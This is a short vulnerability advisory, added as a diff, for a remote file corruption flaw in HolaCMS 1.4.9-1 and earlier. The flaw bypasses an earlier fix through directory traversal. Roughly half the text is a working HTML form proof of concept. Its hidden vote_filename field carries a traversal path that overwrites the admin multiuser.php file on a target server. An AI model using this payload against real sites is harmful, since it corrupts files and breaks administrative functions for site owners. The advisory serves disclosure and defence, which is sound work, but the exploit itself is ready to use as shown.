@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/12799/info
+
+HolaCMS is prone to a vulnerability that may allow remote users to corrupt files on the server.
+
+This issue is similar to the vulnerability described in BID 12789 (HolaCMS Voting Module Remote File Corruption Vulnerability). It is reported that HolaCMS 1.4.9-1, which was released to address the issue in BID 12789 is still vulnerable to a variant of that issue.
+
+Specifically, an attacker can bypass the fix introduced in HolaCMS 1.4.9-1 by including directory traversal sequences in the path to a target file.
+
+HolaCMS 1.4.9-1 and prior versions are affected by this issue.
+
+<form action="http://www.example.com/[site-with-vote].php?vote=1" method="POST">
+<input type="hidden" name="vote_filename" value="holaDB/votes/../../admin/multiuser/multiuser.php">
+<input type="hidden" name="result" value="0">
+<input type="submit" value="Stimme abgeben" name="button">
+</form> 
